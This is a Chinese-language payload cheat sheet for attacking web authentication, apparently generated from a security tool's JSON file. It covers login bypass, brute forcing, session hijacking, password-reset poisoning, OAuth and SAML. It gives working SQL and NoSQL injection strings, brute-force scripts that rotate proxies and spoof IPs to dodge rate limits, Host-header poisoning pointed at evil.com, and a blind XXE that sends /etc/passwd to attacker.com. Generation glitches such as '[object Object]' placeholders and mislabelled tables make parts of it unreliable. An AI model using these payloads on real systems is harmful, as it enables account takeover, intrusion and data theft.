# 认证漏洞 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（10 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. 认证绕过

- **id:** `auth-bypass`
- **分类:** 认证漏洞 / 认证绕过
- **tags:** `auth` `bypass` `authentication`

Web应用认证绕过技术

**前置条件**

- 目标存在认证机制
- 认证实现存在缺陷

**利用步骤**

#### SQL注入绕过

```
admin'--
admin' OR '1'='1
```

SQL注入绕过登录

| 片段 | 说明 | 类型 |
|---|---|---|
| `OR '1'='1'` | 逻辑永真 | keyword |
| `--` | SQL注释 | operator |

#### 数组绕过

```
user[]=admin&pass[]=admin
```

PHP数组绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `user=admin&pass=admin` | 命令/关键字 | command |

#### 类型转换

```
# PHP类型转换绕过 - 数组与类型混淆:
# 1. 数组绕过密码比较(strcmp绕过):
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user=admin&pass[]=1
# strcmp(array, string) 在PHP中返回NULL，NULL == 0 为true

# 2. 松散比较绕过:
POST /login HTTP/1.1
Content-Type: application/json,

        syntaxBreakdown: [
          { part: ''', explanation: { zh: '闭合引号', en: 'Close quote' }, type: 'char' },
          { part: 'OR', explanation: { zh: '逻辑或', en: 'Logical OR' }, type: 'keyword' },
          { part: '--', explanation: { zh: 'SQL注释', en: 'SQL comment' }, type: 'operator' }
        ]
{"user":"admin","pass":true}
# true == "any_string" 在PHP松散比较中为true

# 3. 数字型字符串绕过:
{"user":"admin","pass":0}
# 0 == "password_string" 在PHP中为true(PHP < 8.0)
```

类型转换绕过

#### JSON绕过

```
{"user":"admin","pass":{"$ne":""}}
```

NoSQL绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `$ne` | MongoDB不等于操作符 | operator |

#### IP伪造

```
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
```

IP伪造绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `X-Forwarded-For` | 伪造来源IP | header |

#### HTTP方法

```
# HTTP方法篡改绕过认证:
# 1. 尝试不同HTTP方法:
curl -X POST "http://target.com/admin" -v
curl -X PUT "http://target.com/admin" -v
curl -X PATCH "http://target.com/admin" -v
curl -X DELETE "http://target.com/admin" -v
curl -X OPTIONS "http://target.com/admin" -v

# 2. 方法覆盖头:
curl -X POST -H "X-HTTP-Method-Override: PUT" "http://target.com/admin"
curl -X POST -H "X-Method-Override: DELETE" "http://target.com/admin"

# 3. URL路径穿越绕过:
curl "http://target.com/admin/..;/admin"
curl "http://target.com/;/admin"
curl "http://target.com/%2e%2e/admin"
```

HTTP方法绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `PUT` | 使用非GET/POST方法 | method |

**WAF 绕过**

#### HTTP方法篡改与路径规范化

```
# HTTP方法篡改:
GET /admin HTTP/1.1 → 403
POST /admin HTTP/1.1 → 200
PATCH /admin HTTP/1.1
OPTIONS /admin HTTP/1.1
X-HTTP-Method: PUT
X-HTTP-Method-Override: DELETE

# 路径规范化:
/admin → 403
/ADMIN → 200
/admin/ → 200
//admin → 200
/./admin → 200
/admin..;/ → 200
/%61dmin → 200
```

使用非标准HTTP方法或方法覆盖头绕过基于方法的访问控制，利用URL路径大小写、双斜杠、点号、编码等规范化差异绕过路径匹配

| 片段 | 说明 | 类型 |
|---|---|---|
| `# HTTP方法篡改: GET /admin HTTP/1.1 → 403 POST /admin HTTP/1.1 → 200 PATCH /admin HTTP/1.1 OPTIONS /admin HTTP/1.1 X-HTTP-Method: PUT X-HTTP-Method-Override: ` | SQL表达式 | value |
| `DELETE` | SQL关键字 | keyword |
| `  # 路径规范化: /admin → 403 /ADMIN → 200 /admin/ → 200 //admin → 200 /./admin → 200 /admin..;/ → 200 /%61dmin → 200` | SQL表达式 | value |

#### HTTP/2伪头与请求拆分

```
# HTTP/2伪头绕过:
:method: GET
:path: /admin
:authority: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Header注入:
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: localhost
```

利用HTTP/2伪头部(:path等)或X-Original-URL/X-Rewrite-URL头覆盖请求路径绕过反向代理ACL，通过IP伪造头绕过基于来源的认证

| 片段 | 说明 | 类型 |
|---|---|---|
| `# HTTP/2伪头绕过:` | 主要命令 | command |
| `...` | 共13行 | value |

**教程**

[object Object]

---

### 2. 暴力破解

- **id:** `auth-brute`
- **分类:** 认证漏洞 / 暴力破解
- **tags:** `auth` `brute-force` `password`

自动化密码猜测攻击

**前置条件**

- 无验证码
- 无锁定策略

**利用步骤**

#### Pitchfork

```
Burp Intruder: Pitchfork模式
```

多字段同时爆破

| 片段 | 说明 | 类型 |
|---|---|---|
| `Pitchfork` | 一对一映射爆破 | tool-mode |

#### Cluster bomb

```
Burp Intruder: Cluster bomb模式
```

笛卡尔积爆破

| 片段 | 说明 | 类型 |
|---|---|---|
| `Cluster bomb` | 全排列爆破 | tool-mode |

#### 基于响应差异的用户名枚举

```
# 通过响应长度/时间差异枚举有效用户名
# 对比有效 vs 无效用户名的响应:
curl -s -o /dev/null -w "user=admin: code=%{http_code} size=%{size_download} time=%{time_total}s"   -d "username=admin&password=wrong" "http://target.com/login"

curl -s -o /dev/null -w "user=xxxxx: code=%{http_code} size=%{size_download} time=%{time_total}s"   -d "username=nonexistent_user_xxxxx&password=wrong" "http://target.com/login"

# 批量枚举(注意响应差异):
for user in $(cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt); do
  resp=$(curl -s -o /tmp/resp.txt -w "%{http_code}:%{size_download}:%{time_total}"     -d "username=${user}&password=test" "http://target.com/login")
  echo "${user}: ${resp}"
  sleep 1
done
```

通过响应状态码/长度/时间的差异来区分有效和无效用户名

| 片段 | 说明 | 类型 |
|---|---|---|
| `-w "%{http_code}:%{size_download}:%{time_total}"` | 输出响应码、响应体大小和响应时间用于对比分析 | parameter |
| `-o /dev/null` | 丢弃响应体，仅保留统计信息 | parameter |
| `sleep 1` | 请求间隔避免触发速率限制 | command |

> platform: `linux`

#### 验证码/OTP爆破与绕过

```
# 场景1: 4-6位数字验证码爆破
# 检测验证码是否有速率限制:
for i in $(seq 1 10); do
  code=$(printf "%06d" $RANDOM | cut -c1-6)
  resp=$(curl -s -o /dev/null -w "%{http_code}"     -d "otp=${code}" "http://target.com/verify-otp")
  echo "Attempt ${i}: otp=${code} → HTTP ${resp}"
done

# 场景2: 通过修改响应绕过前端验证码校验
# 抓包修改响应 {"success":false} → {"success":true}

# 场景3: 验证码复用(同一验证码多次有效)
# 获取验证码后，用同一验证码尝试不同账户

# 场景4: 验证码泄露在响应中
curl -v -d "phone=13800138000&action=send_code" "http://target.com/api/sms"
# 检查响应头/响应体是否包含验证码
```

针对OTP验证码的爆破和各种逻辑绕过手法

| 片段 | 说明 | 类型 |
|---|---|---|
| `printf "%06d" $RANDOM` | 生成6位随机数字作为验证码猜测 | command |
| `速率限制检测` | 如果10次请求都返回200则可能无速率限制 | value |
| `响应修改` | 通过Burp拦截修改服务端响应实现绕过 | value |

#### 分布式暴力破解与IP轮换

```
# 使用代理池进行分布式爆破:
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://target.com/login"
proxies_list = open("proxies.txt").read().splitlines()
usernames = ["admin", "administrator", "root", "test"]
passwords = open("/usr/share/wordlists/rockyou-top1000.txt").read().splitlines()

proxy_cycle = itertools.cycle(proxies_list)

def try_login(combo):
    user, pwd = combo
    proxy = next(proxy_cycle)
    try:
        r = requests.post(TARGET,
            data={"username": user, "password": pwd},
            proxies={"http": proxy, "https": proxy},
            timeout=10,
            headers={"User-Agent": f"Mozilla/5.0 (rv:{hash(proxy)%90+10}.0)"}
        )
        if r.status_code == 302 or "dashboard" in r.text.lower():
            print(f"[+] FOUND: {user}:{pwd} via {proxy}")
            return (user, pwd)
    except: pass
    return None

combos = [(u,p) for u in usernames for p in passwords]
with ThreadPoolExecutor(max_workers=5) as pool:
    results = list(pool.map(try_login, combos))
    found = [r for r in results if r]
    for f in found: print(f"[+] Valid: {f[0]}:{f[1]}")
```

使用代理池轮换IP避免被封禁，进行分布式暴力破解

| 片段 | 说明 | 类型 |
|---|---|---|
| `itertools.cycle(proxies_list)` | 循环使用代理池中的代理 | command |
| `ThreadPoolExecutor` | 多线程并发提高爆破速度 | command |
| `User-Agent轮换` | 每个代理使用不同UA指纹 | value |

**WAF 绕过**

#### 速率限制绕过(HTTP头伪造)

```
# 通过伪造IP头绕过基于IP的速率限制:
import requests
import random

TARGET = "http://target.com/login"
headers_rotation = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
    "X-Remote-Addr", "X-Client-IP", "X-Remote-IP",
    "CF-Connecting-IP", "True-Client-IP", "Forwarded"
]

def brute_with_header_bypass(username, password):
    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    for header in headers_rotation:
        h[header] = fake_ip
    r = requests.post(TARGET, data={"username": username, "password": password}, headers=h, timeout=10)
    return r

# 每次请求使用不同伪造IP
passwords = ["admin", "123456", "password", "admin123", "root"]
for pwd in passwords:
    r = brute_with_header_bypass("admin", pwd)
    print(f"admin:{pwd} → {r.status_code} ({len(r.text)})")
```

通过伪造X-Forwarded-For等HTTP头绕过基于IP的速率限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `X-Forwarded-For` | 告诉后端真实客户端IP的代理头，可伪造 | parameter |
| `random IP` | 每次生成随机IP绕过基于IP的计数器 | value |

#### 参数污染与大小写绕过

```
# 参数污染绕过:
# 正常请求(被限制):
curl -d "username=admin&password=test" "http://target.com/login"

# 参数重复(某些后端取最后一个值):
curl -d "username=admin&username=admin&password=test" "http://target.com/login"

# JSON格式切换(如果支持):
curl -H "Content-Type: application/json"   -d '{"username":"admin","password":"test"}' "http://target.com/login"

# 大小写混淆:
curl -d "Username=admin&Password=test" "http://target.com/login"
curl -d "USERNAME=admin&PASSWORD=test" "http://target.com/login"

# Unicode混淆:
curl -d "username=admin&password=test" "http://target.com/login"

# 额外参数注入:
curl -d "username=admin&password=test&captcha=&token=" "http://target.com/login"

# 不同编码:
curl -d "username=admin&password=test" "http://target.com/login" -H "Content-Type: application/x-www-form-urlencoded; charset=IBM037"
```

通过参数污染、格式切换、编码混淆绕过WAF对暴力破解的检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 参数污染绕过:` | 主要命令 | command |
| `...` | 共17行 | value |

**教程**

[object Object]

---

### 3. 会话劫持

- **id:** `auth-session`
- **分类:** 认证漏洞 / 会话管理
- **tags:** `auth` `session` `hijack`

利用会话管理缺陷劫持或伪造用户会话，获取未授权访问权限

**前置条件**

- 目标使用基于Cookie或Token的会话管理
- 可以截获或预测会话标识符
- 网络通信未完全加密(HTTP)或存在XSS

**利用步骤**

#### 会话Cookie属性分析

```
# 检测Cookie安全属性
curl -v "http://target.com/login" 2>&1 | grep -i "set-cookie"

# 检查关键属性:
# - HttpOnly: 防止JS读取Cookie
# - Secure: 仅通过HTTPS传输
# - SameSite: 防止CSRF
# - Path/Domain: Cookie作用域
# - Expires/Max-Age: 会话生命周期

# 批量分析Cookie:
curl -c - "http://target.com/login" -d "user=test&pass=test" 2>/dev/null | tail -5
```

分析目标会话Cookie的安全属性配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `curl -v` | 详细模式显示完整HTTP头 | command |
| `Set-Cookie` | 服务端设置Cookie的响应头 | value |
| `HttpOnly` | 防止JavaScript通过document.cookie读取 | value |
| `curl -c -` | 将Cookie输出到stdout | command |

> platform: `linux`

#### 会话固定攻击(Session Fixation)

```
# 1. 攻击者获取一个有效的sessionId
curl -c cookies.txt "http://target.com/"
cat cookies.txt | grep -i "session|jsession|phpsess"

# 2. 构造包含固定sessionId的链接诱使受害者登录
# http://target.com/login;jsessionid=ATTACKER_SESSION_ID
# 或通过Set-Cookie注入:
# http://target.com/page?lang=en%0d%0aSet-Cookie:%20PHPSESSID=FIXED_SESSION

# 3. 受害者使用该sessionId登录后，攻击者直接使用同一sessionId
curl -b "PHPSESSID=FIXED_SESSION" "http://target.com/dashboard"
```

通过预设sessionId使受害者登录后攻击者可以复用该会话

| 片段 | 说明 | 类型 |
|---|---|---|
| `jsessionid=` | Java应用的会话标识符 | value |
| `%0d%0a` | CRLF注入用于注入Set-Cookie头 | value |
| `curl -b` | 使用指定Cookie发送请求 | command |

> platform: `linux`

#### 会话劫持(HTTP嗅探)

```
# 在同一网络中嗅探HTTP Cookie (需要中间人位置)
# 使用Wireshark过滤:
http.cookie contains "session" or http.cookie contains "PHPSESSID"

# 或使用tcpdump:
tcpdump -i eth0 -A -s 0 'port 80 and (tcp[((tcp[12:1]&0xf0)>>2):4] = 0x436F6F6B)'

# 获取Cookie后直接使用:
curl -b "PHPSESSID=STOLEN_SESSION_ID" "http://target.com/admin/dashboard"
```

在未加密的HTTP通信中截获会话Cookie

| 片段 | 说明 | 类型 |
|---|---|---|
| `http.cookie contains` | Wireshark显示过滤器匹配Cookie字段 | command |
| `tcpdump -A` | 以ASCII格式显示数据包内容 | command |
| `0x436F6F6B` | "Cook"的十六进制表示，匹配Cookie头 | value |

> platform: `linux`

#### 会话预测(弱随机性)

```
# 批量收集sessionId分析规律
for i in $(seq 1 20); do
  sid=$(curl -sI "http://target.com/" | grep -i "set-cookie" | grep -oP "(?<=PHPSESSID=)[^;]+")
  echo "$i: $sid"
  sleep 0.5
done

# 使用Burp Suite Sequencer分析随机性
# 或Python分析:
# python3 -c "
# import hashlib, time
# # 如果sessionId基于时间戳:
# for t in range(int(time.time())-100, int(time.time())+100):
#     predicted = hashlib.md5(str(t).encode()).hexdigest()
#     print(predicted)
# "
```

通过收集多个sessionId分析其生成规律，预测有效的会话标识符

| 片段 | 说明 | 类型 |
|---|---|---|
| `grep -oP "(?<=PHPSESSID=)[^;]+"` | 用正则提取PHPSESSID的值 | command |
| `Sequencer` | Burp Suite的会话随机性分析工具 | value |

> platform: `linux`

**WAF 绕过**

#### Cookie Jar溢出与Cookie Tossing

```
# Cookie Jar溢出:
# 设置大量Cookie(超过浏览器上限~50个)使旧Cookie被挤出:
for(let i=0;i<700;i++){document.cookie=`c${i}=x;domain=.target.com`}
# 原有session Cookie被挤出后可注入攻击者的session

# Cookie Tossing(子域注入):
# 从subdomain.target.com设置Cookie:
document.cookie="session=ATTACKER_SID;domain=.target.com;path=/"
# 该Cookie在主域target.com上也生效
```

通过大量设置Cookie超出浏览器存储上限挤出合法session Cookie，或利用子域名权限向父域注入恶意Cookie实现会话覆盖

| 片段 | 说明 | 类型 |
|---|---|---|
| `document.cookie` | 获取Cookie | variable |

#### SameSite绕过与跨站会话泄露

```
# SameSite=Lax绕过(顶级导航GET请求携带Cookie):
<a href="http://target.com/api/transfer?to=attacker&amount=1000">click</a>
# Lax模式下GET请求会携带Cookie

# SameSite=None利用(需Secure):
# 如果设置了SameSite=None但缺少Secure属性:
# Chrome会拒绝，但旧浏览器可能接受

# 通过window.open绕过:
window.open("http://target.com/api/userinfo")
# 新窗口属于顶级导航，Lax模式下携带Cookie
```

利用SameSite=Lax允许顶级导航GET请求携带Cookie的特性通过链接点击或window.open发起带凭据的跨站请求

| 片段 | 说明 | 类型 |
|---|---|---|
| `# SameSite=Lax绕过(顶级导航GET请求携带Cookie):` | 主要命令 | command |
| `...` | 共9行 | value |

**教程**

[object Object]

---

### 4. 密码重置漏洞

- **id:** `auth-password-reset`
- **分类:** 认证漏洞 / 逻辑漏洞
- **tags:** `auth` `password-reset` `logic`

绕过密码重置流程

**前置条件**

- 密码重置功能存在逻辑缺陷

**利用步骤**

#### Host头投毒

```
# Host头投毒劫持密码重置链接:
# 1. 基础Host头投毒:
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
# 重置链接将变为: http://evil.com/reset?token=xxx

# 2. X-Forwarded-Host投毒:
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@target.com

# 3. 双Host头:
POST /forgot-password HTTP/1.1
Host: target.com
Host: evil.com

email=victim@target.com

# 4. 通过Burp Collaborator验证:
Host: BURP-COLLABORATOR-ID.burpcollaborator.net
```

重置链接指向攻击者域名

| 片段 | 说明 | 类型 |
|---|---|---|
| `Host` | HTTP Host头 | header |

#### Token爆破

```
# 密码重置验证码爆破:
# 1. 发送重置验证码请求:
curl -d "email=victim@target.com" "http://target.com/forgot-password"

# 2. 四位数字验证码爆破(0000-9999):
# Burp Intruder设置:
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=victim@target.com&code=§0000§
# Payload: Numbers, From 0, To 9999, Min/Max 4 digits

# 3. 六位验证码爆破(需更多时间):
import requests
for code in range(0, 999999):
    r = requests.post('http://target.com/reset-password',
        data={'email':'victim@target.com','code':f'{code:06d}'})
    if 'success' in r.text or r.status_code == 302:
        print(f'Valid code: {code:06d}')
        break
```

验证码过短

| 片段 | 说明 | 类型 |
|---|---|---|
| `Token` | 重置验证码 | parameter |

#### 密码重置Token可预测性分析

```
# 批量请求密码重置Token分析规律:
import requests
import time
import hashlib

tokens = []
for i in range(10):
    r = requests.post("http://target.com/api/password-reset",
        data={"email": f"test{i}@example.com"})
    # 从邮件API或响应中获取token
    if "token" in r.text:
        import json
        token = json.loads(r.text).get("token", "")
        tokens.append({"time": time.time(), "token": token})
        print(f"Token {i}: {token}")
    time.sleep(0.5)

# 分析Token模式:
for i, t in enumerate(tokens):
    print(f"Token {i}: len={len(t['token'])}, "
          f"hex={'yes' if all(c in '0123456789abcdef' for c in t['token'].lower()) else 'no'}, "
          f"time={t['time']}")

# 检查是否基于时间戳:
for ts in range(int(tokens[0]['time'])-5, int(tokens[0]['time'])+5):
    candidate = hashlib.md5(str(ts).encode()).hexdigest()
    if candidate == tokens[0]['token']:
        print(f"[+] Token is MD5(timestamp)! Predictable!")
```

分析密码重置Token的生成规律，判断是否可预测

| 片段 | 说明 | 类型 |
|---|---|---|
| `hashlib.md5(str(ts).encode())` | 测试Token是否为时间戳的MD5哈希 | command |
| `批量请求` | 收集多个Token样本用于模式分析 | value |

#### 密码重置流程逻辑缺陷

```
# 1. 参数篡改 - 修改邮箱/手机号:
# 发送重置请求时替换接收邮箱
curl -d "email=victim@target.com&notify_email=attacker@evil.com"   "http://target.com/api/password-reset"

# 2. IDOR - 直接使用他人的重置Token/UID:
curl -d "token=VALID_TOKEN&uid=OTHER_USER_ID&new_password=hacked123"   "http://target.com/api/password-reset/confirm"

# 3. 步骤跳过 - 直接访问设置新密码页面:
curl -d "uid=123&new_password=test12345"   "http://target.com/api/password-reset/set-password"

# 4. Token不失效 - 使用已用过的Token:
curl -d "token=ALREADY_USED_TOKEN&new_password=newpass123"   "http://target.com/api/password-reset/confirm"

# 5. 密码重置投毒(Host头注入):
curl -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"   -d "email=victim@target.com" "http://target.com/api/password-reset"
# 受害者收到的重置链接: http://evil.com/reset?token=xxx
```

测试密码重置流程中的各种逻辑漏洞

| 片段 | 说明 | 类型 |
|---|---|---|
| `X-Forwarded-Host: evil.com` | Host头投毒使重置链接指向攻击者域名 | parameter |
| `uid=OTHER_USER_ID` | IDOR攻击，篡改用户ID重置他人密码 | value |

**WAF 绕过**

#### Host头投毒多种变体绕过

```
# 标准Host头投毒:
curl -H "Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# X-Forwarded-Host(常被Web框架信任):
curl -H "X-Forwarded-Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# 多Host头:
curl -H "Host: target.com" -H "Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# Host中注入端口:
curl -H "Host: target.com@evil.com" -d "email=victim@target.com" "http://target.com/forgot"
curl -H "Host: target.com:evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# 绝对URL覆盖Host:
curl "http://target.com/forgot" -H "Host: evil.com" --request-target "http://target.com/forgot"

# X-Original-URL / X-Rewrite-URL:
curl -H "X-Original-URL: /forgot" -H "Host: evil.com" "http://target.com/forgot"
```

Host头投毒的多种WAF绕过变体

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 标准Host头投毒:` | 主要命令 | command |
| `...` | 共13行 | value |

#### Token爆破速率限制绕过

```
# IP轮换绕过速率限制:
import requests
import random

def try_token(token, proxy=None):
    headers = {
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ])
    }
    r = requests.post("http://target.com/reset-password",
        data={"token": token, "new_password": "Test123!"},
        headers=headers, timeout=10)
    return r.status_code != 400

# 如果Token是6位数字:
for i in range(0, 1000000):
    token = f"{i:06d}"
    if try_token(token):
        print(f"[+] Valid token: {token}")
        break
```

通过IP头轮换和UA随机化绕过重置Token爆破的速率限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `# IP轮换绕过速率限制:` | 主要命令 | command |
| `...` | 共22行 | value |

**教程**

[object Object]

---

### 5. OAuth漏洞

- **id:** `auth-oauth`
- **分类:** 认证漏洞 / OAuth
- **tags:** `auth` `oauth` `redirect`

OAuth认证流程漏洞

**前置条件**

- 使用OAuth登录

**利用步骤**

#### CSRF攻击

```
# OAuth CSRF - 强制账号绑定攻击:
# 1. 获取攻击者的OAuth授权码:
#    正常走OAuth流程到callback但不完成
#    截获: http://target.com/callback?code=ATTACKER_CODE

# 2. 构造CSRF页面:
<html>
  <body>
    <img src="http://target.com/callback?code=ATTACKER_CODE">
    <!-- 或使用iframe -->
    <iframe src="http://target.com/callback?code=ATTACKER_CODE" style="display:none"></iframe>
  </body>
</html>

# 3. 受害者访问该页面后，其账号将绑定攻击者的OAuth账号
# 4. 攻击者可通过OAuth登录受害者账号

# 防御检测: 检查授权请求是否携带state参数
```

缺乏state参数

| 片段 | 说明 | 类型 |
|---|---|---|
| `state` | 防CSRF参数 | parameter |

#### Redirect URI

```
redirect_uri=http://attacker.com
```

重定向到攻击者获取Code

| 片段 | 说明 | 类型 |
|---|---|---|
| `redirect_uri` | 回调地址 | parameter |

#### OAuth State参数缺失/可预测CSRF

```
# 1. 检测state参数是否存在:
# 访问OAuth授权URL，查看是否有state参数
curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code"

# 2. 如果没有state参数 → CSRF绑定攻击:
# 攻击者用自己的OAuth账号发起授权，获取code
# 构造链接: http://target.com/callback?code=ATTACKER_CODE
# 发给受害者 → 受害者的账户绑定了攻击者的OAuth账号

# 3. 如果state可预测:
# 多次请求获取state值分析规律
for i in $(seq 1 5); do
  state=$(curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code" | grep -i "location" | grep -oP "state=([^&]+)" | cut -d= -f2)
  echo "State $i: $state"
  sleep 0.5
done
```

检测OAuth流程中state参数的缺失或可预测性

| 片段 | 说明 | 类型 |
|---|---|---|
| `state参数` | OAuth中防止CSRF的随机值，缺失则可攻击 | value |
| `code=ATTACKER_CODE` | 将攻击者的授权码注入受害者的回调 | value |

#### Token窃取与Scope越权

```
# 1. 通过redirect_uri泄露Token:
# implicit flow中Token在URL fragment中:
# http://attacker.com/callback#access_token=xxx
# 使用Referer泄露:
# 如果callback页面有外链，Token会通过Referer泄露

# 2. Scope越权 - 请求更高权限:
curl "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code&scope=admin+write+delete"

# 3. Token复用测试 - 用authorization_code换取的Token访问其他API:
TOKEN="stolen_access_token_here"
curl -H "Authorization: Bearer ${TOKEN}" "http://target.com/api/admin/users"
curl -H "Authorization: Bearer ${TOKEN}" "http://target.com/api/admin/settings"
curl -H "Authorization: Bearer ${TOKEN}" "http://other-app.target.com/api/user/info"

# 4. refresh_token窃取后无限续期:
curl -d "grant_type=refresh_token&refresh_token=STOLEN_REFRESH_TOKEN&client_id=xxx"   "http://target.com/oauth/token"
```

OAuth Token窃取、Scope越权、跨应用Token复用测试

| 片段 | 说明 | 类型 |
|---|---|---|
| `scope=admin+write+delete` | 请求超出应用正常权限的Scope | value |
| `refresh_token` | 长期有效的刷新令牌，被窃取后可无限续期 | value |

**WAF 绕过**

#### Redirect URI绕过技巧合集

```
# 白名单绕过技巧:

# 1. 子域名绕过(如果白名单用后缀匹配):
redirect_uri=http://evil.target.com/callback
redirect_uri=http://target.com.evil.com/callback

# 2. 路径遍历:
redirect_uri=http://target.com/callback/../../../evil-page
redirect_uri=http://target.com/callback/..%2f..%2f..%2fevil-page

# 3. 参数注入:
redirect_uri=http://target.com/callback?next=http://evil.com
redirect_uri=http://target.com/callback%23@evil.com

# 4. 端口注入:
redirect_uri=http://target.com:8080@evil.com/callback

# 5. URL编码绕过:
redirect_uri=http://target.com%40evil.com/callback
redirect_uri=http://target.com%2540evil.com/callback

# 6. localhost/内网绕过:
redirect_uri=http://127.0.0.1/callback
redirect_uri=http://[::1]/callback

# 7. 开放重定向链:
redirect_uri=http://target.com/redirect?url=http://evil.com
```

多种redirect_uri白名单绕过技术

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 白名单绕过技巧:` | 主要命令 | command |
| `...` | 共20行 | value |

**教程**

[object Object]

---

### 6. SAML漏洞

- **id:** `auth-saml`
- **分类:** 认证漏洞 / SAML
- **tags:** `auth` `saml` `xml`

SAML断言攻击

**前置条件**

- 使用SAML SSO

**利用步骤**

#### XML签名绕过

```
# SAML断言篡改 - 删除签名验证:
# 1. 拦截SAML Response(Burp Suite):
# POST /saml/acs 中的SAMLResponse参数

# 2. Base64解码:
echo "SAML_RESPONSE_BASE64" | base64 -d > saml.xml

# 3. 修改断言中的NameID(提权为admin):
# 原始: <NameID>user@target.com</NameID>
# 修改: <NameID>admin@target.com</NameID>

# 4. 删除签名块(删除整个<Signature>...</Signature>):
xmlstarlet ed -d "//*[local-name()='Signature']" saml.xml > saml_modified.xml

# 5. 重新Base64编码并替换:
base64 -w0 saml_modified.xml | xclip -sel clip

# 6. 在Burp中用修改后的值替换SAMLResponse参数
```

SAML Raider工具

| 片段 | 说明 | 类型 |
|---|---|---|
| `Signature` | XML签名 | tag |

#### XXE攻击

```
# SAML XXE注入攻击:
# 1. 解码SAML Response后，在XML声明后注入DTD:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response ...>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>

# 2. 带外数据外泄(Blind XXE):
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

# evil.dtd内容:
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
%payload;

# 3. Base64编码后替换SAMLResponse参数发送
```

SAML基于XML

| 片段 | 说明 | 类型 |
|---|---|---|
| `DOCTYPE` | XML实体定义 | tag |

#### SAML Response篡改与重放

```
# 1. 拦截SAML Response:
# Burp Suite中拦截POST到/saml/acs的请求
# SAMLResponse参数是Base64编码的XML

# 2. 解码并修改:
echo "BASE64_SAML_RESPONSE" | base64 -d > saml_resp.xml

# 3. 修改关键字段:
# - NameID: 修改为目标用户 (admin@target.com)
# - Audience: 确保匹配SP
# - Conditions/NotBefore/NotOnOrAfter: 确保时间有效

# 使用xmlstarlet修改:
xmlstarlet ed -N saml="urn:oasis:names:tc:SAML:2.0:assertion"   -u "//saml:NameID" -v "admin@target.com" saml_resp.xml > modified.xml

# 4. 重新编码提交:
cat modified.xml | base64 -w0 > encoded.txt
curl -d "SAMLResponse=$(cat encoded.txt)&RelayState=/" "http://target.com/saml/acs"

# 5. 重放攻击(如果未检查InResponseTo/时间):
# 直接重放之前抓到的有效SAMLResponse
curl -d "SAMLResponse=PREVIOUSLY_CAPTURED&RelayState=/" "http://target.com/saml/acs"
```

SAML Response篡改身份信息和重放攻击

| 片段 | 说明 | 类型 |
|---|---|---|
| `NameID` | SAML断言中标识用户身份的字段 | value |
| `InResponseTo` | 防重放的请求关联字段，缺失检查则可重放 | value |
| `xmlstarlet` | XML编辑工具，用于修改SAML断言中的值 | command |

> platform: `linux`

#### SAML签名绕过高级技术

```
# 1. 签名包装攻击(XSW - XML Signature Wrapping):
# 将签名的断言移到XML其他位置，注入恶意断言
# 有8种XSW攻击变体

# 使用SAML Raider (Burp插件):
# - 拦截SAMLResponse
# - 选择XSW攻击类型(1-8)
# - 修改NameID为admin
# - 重放

# 2. 签名排除(如果SP不验证签名):
# 删除XML中的<ds:Signature>整个节点
xmlstarlet ed -N ds="http://www.w3.org/2000/09/xmldsig#"   -d "//ds:Signature" saml_resp.xml > no_sig.xml

# 3. 自签名证书替换:
# 生成自签名证书:
openssl req -new -x509 -days 365 -nodes -newkey rsa:2048   -keyout my.key -out my.crt -subj "/CN=Evil IDP"

# 使用xmlsec1签名:
xmlsec1 --sign --privkey-pem my.key --id-attr:ID Assertion saml_resp.xml

# 4. Comment注入绕过:
# admin<!-- -->@target.com 可能被解析为 admin@target.com
